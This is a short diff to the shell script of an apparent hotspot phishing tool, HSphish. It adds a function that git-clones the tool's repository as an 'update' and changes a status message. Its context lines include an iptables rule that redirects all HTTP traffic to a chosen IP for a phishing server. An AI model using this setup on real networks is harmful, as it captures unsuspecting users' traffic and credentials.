@@ -49,8 +49,24 @@ function execute_setup_commands {
   iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination $IP
   clear
   sleep 1
-  echo -e "\e[1m\e[32mFinished, loading HS tool\e[0m"  # Bold and green color for success message
+  echo -e "\e[1m\e[32mFinished, loading Updating tool\e[0m"  # Bold and green color for success message
   sleep 1
+}
+
+function update_script {
+
+repo_url="https://github.com/CPScript/HSphish"
+
+clone_dir="HSphish"
+
+git clone "$repo_url"
+
+cd "$clone_dir"
+
+sleep 1
+  echo -e "\e[1m\e[32mFinished Updating tool.\e[0m"
+  sleep 1
+
 }
 
 # Function to unzip the file to the corresponding directory and start the PHP server
@@ -180,5 +196,6 @@ function exit_with_cleanup {
 
 # Start the script
 execute_setup_commands
+update_script
 main_menu
 
